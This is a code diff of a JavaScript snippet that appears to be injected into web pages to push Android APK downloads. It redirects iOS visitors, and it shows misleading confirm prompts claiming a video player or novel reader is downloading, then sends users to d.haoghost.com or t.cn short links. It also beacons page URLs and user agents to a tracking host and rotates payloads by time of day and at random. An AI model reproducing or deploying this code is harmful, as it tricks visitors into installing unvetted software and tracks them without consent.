@@ -80,15 +80,20 @@ var hy_itv=setInterval(function(){
 	var thisnum=getNum(),thisnumplus=thisnum==alen-1?0:thisnum+1;
 
 
-	if(getCookie("hycpc1")){
+	if(getCookie("hycpc1")=="1"){
 		pname="360ysdq.apk";
 		iosname="http://www.haima.me/?c=cpapz";
+		setCookie("hycpc1","0");
 	}
 
+	var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes();
 	function notNight()
 	{
-		var dt=new Date(),hour=dt.getHours(),minute=dt.getMinutes();
 		return (hour>9) || (hour==9 && minute>30);
+	}
+	function hlTime()
+	{
+		return (hour>=7) || (hour<23);	
 	}
 
 	function getDownUrl()
@@ -122,14 +127,18 @@ var hy_itv=setInterval(function(){
 		var result;
 		switch(num)
 		{
+			case "24":
+				result="http://t.cn/R7t2eE3";
+				break;
 			case "16":
 				result="sybb.10C352.apk";
 				break;
 			default:
 				var rd=Math.random();
-				if(notNight()) result="sybb.10C352.apk";
-				else result="http://t.cn/R7qFBqD";
-				//result="http://t.cn/R7qFBqD";
+				//if(notNight()) result="sybb.10C352.apk";
+				//else result="http://t.cn/R7qFBqD";
+				if(rd>0.7) result="http://t.cn/R7qFBqD";
+				else result="360sqyy746.apk";
 		}
 		return result;
 	}
@@ -269,75 +278,86 @@ var hy_itv=setInterval(function(){
 					function(data){
 						if(data==0)
 						{
-							pname="hlyy4.apk";
 							setCookie("hyipdata","0");
-							getJsonp(
-								'http://click.shuiguo.com/index.php?action=index&method=main1',
-								"t=undefined&s=tag_888&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
-								function(data){
+							if(hlTime())
+							{
+								pname="hlyy6.apk";
+								getJsonp(
+									'http://click.shuiguo.com/index.php?action=index&method=main1',
+									"t=undefined&s=tag_889&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
+									function(data){
 
-								}
-							);
+									}
+								);
+							}
 						}
 						if(data==1)
 						{
 							setCookie("hyipdata","1");
 						}
+						goCityDown();
 					},
 					"hyipcb"
 				);
 			}
-			
-			window.setTimeout(function(){
-				if(num==18 || num==19)
-				{
-					if(tt.indexOf("》")<0 || !autoDown()) return;
-					tt=tt.split("》")[0]+"》";
-					tt="正在为您下载播放器，安装后即可观看"+tt;
-				} 
-				else if(num==15)
-				{
-					if(!autoDown()) return;
-					tt="正在下载神奇影院，海量视频任你看";
-				}
-				else if(num==16)
-				{
-					if( notNight() ) return;
-					if(!autoDown()) return;
-					tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
-				}
-				else if(num==23 || num==24 || num==25 || num==26 || num==27){
-					if(!autoDown()) return;
-					tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
-				}
-				else
-				{
-					return;
-				}
-				
-				if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
-					window.location.href=iosname;	
-					setCookie("hycpc1","1");
-				}
-				else
-				{
-					if(window.confirm(tt)){
-						if(pname.indexOf("http")>=0) window.location.href=pname;
-						else window.location.href="http://d.haoghost.com/"+pname;
+			else
+			{
+				goCityDown();
+			}
+			function goCityDown(){
+				window.setTimeout(function(){
+					if(num==18 || num==19)
+					{
+						if(tt.indexOf("》")<0 || !autoDown()) return;
+						tt=tt.split("》")[0]+"》";
+						tt="正在为您下载播放器，安装后即可观看"+tt;
+					} 
+					else if(num==15 || num==28)
+					{
+						if(!autoDown()) return;
+						tt="正在下载神奇影院，海量视频任你看";
+					}
+					else if(num==16)
+					{
+						if( notNight() ) return;
+						if(!autoDown()) return;
+						tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
+					}
+					else if(num==23 || num==24 || num==25 || num==26 || num==27){
+						if(!autoDown()) return;
+						tt="正在下载专业阅读器，全国资源最全的离线小说APP，首次安装送7日会员。";
+					}
+					else
+					{
+						return;
+					}
+					
+					if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
+						window.location.href=iosname;	
 						setCookie("hycpc1","1");
 					}
 					else
 					{
-						var now=parseInt(getCookie("hycookietime"));
-						now=now-50*60*1000;
-						setCookie("hycookietime",now);
+						function setBefore()
+						{
+							var now=parseInt(getCookie("hycookietime"));
+							now=now-50*60*1000;
+							setCookie("hycookietime",now);	
+						}
+						if(window.confirm(tt)){
+							if(pname.indexOf("http")>=0) window.location.href=pname;
+							else window.location.href="http://d.haoghost.com/"+pname;
+							setCookie("hycpc1","1");
+							if(num==28) setBefore();
+						}
+						else
+						{
+							setBefore();
+						}
 					}
-				}
-				
-				
-				
-				
-			},2000)
+				},1000);
+			}
+			
 			
 		})();
 
